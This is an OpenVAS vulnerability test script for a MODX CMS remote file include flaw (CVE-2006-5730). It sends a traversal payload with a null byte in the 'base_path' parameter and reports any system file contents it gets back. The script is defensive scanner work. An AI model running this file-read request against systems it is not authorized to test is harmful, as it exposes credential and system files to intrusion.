###############################################################################
# OpenVAS Vulnerability Test
# $Id: modx_0921_rfi.nasl 12215 2018-11-05 14:48:16Z mmartin $
#
# MODX CMS base_path Parameter Remote File Include Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2008 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80072");
  script_version("$Revision: 12215 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-05 15:48:16 +0100 (Mon, 05 Nov 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-5730");
  script_bugtraq_id(20898);
  script_name("MODX CMS base_path Parameter Remote File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2008 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("gb_modx_cms_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("modx_cms/installed");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/2706");
  script_xref(name:"URL", value:"http://modxcms.com/forums/index.php/topic,8604.0.html");

  script_tag(name:"summary", value:"The remote web server is running MODX CMS, an open source content
  management system which is affected by a remote file include issue.");
  script_tag(name:"insight", value:"The version of MODX CMS installed on the remote host fails to sanitize
  input to the 'base_path' parameter before using it in the
  'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
  script to include PHP code.");
  script_tag(name:"impact", value:"Provided PHP's 'register_globals' setting is enabled, an unauthenticated
  attacker can exploit this issue to view arbitrary files and execute arbitrary code,
  possibly taken from third-party hosts, on the remote host.");
  script_tag(name:"solution", value:"Update to version 0.9.2.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

cpe_list = make_list( "cpe:/a:modx:unknown",
                      "cpe:/a:modx:revolution",
                      "cpe:/a:modx:evolution" );

if( ! infos = get_all_app_ports_from_list( cpe_list:cpe_list ) ) exit( 0 );
cpe = infos['cpe'];
port = infos['port'];

if( ! dir = get_app_location( cpe:cpe, port:port ) ) exit( 0 );

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = "/" + files[pattern];

  if( dir == "/" ) dir = "";
  url = string( dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00" );
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( isnull( res ) ) exit( 0 );

  if( egrep( pattern:pattern, string:res ) ||
      string( "main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream" ) >< res ||
      string( "main(", file, "): failed to open stream: No such file" ) >< res ||
      "open_basedir restriction in effect. File(" >< res )	{

    passwd = NULL;
    if( egrep( pattern:pattern, string:res ) ) {
      passwd = res;
      if( "<br" >< passwd ) passwd = passwd - strstr(passwd, "<br");
    }

    if( passwd ) {
      info = string( "The version of MODX CMS installed in directory '", dir, "'\n",
                     "is vulnerable to this issue. Here is the contents of " + file + "\n",
                     "from the remote host :\n\n", passwd );
    } else {
      info = "";
    }

    security_message( data:info, port:port );
    exit( 0 );
  }
}

exit( 99 );
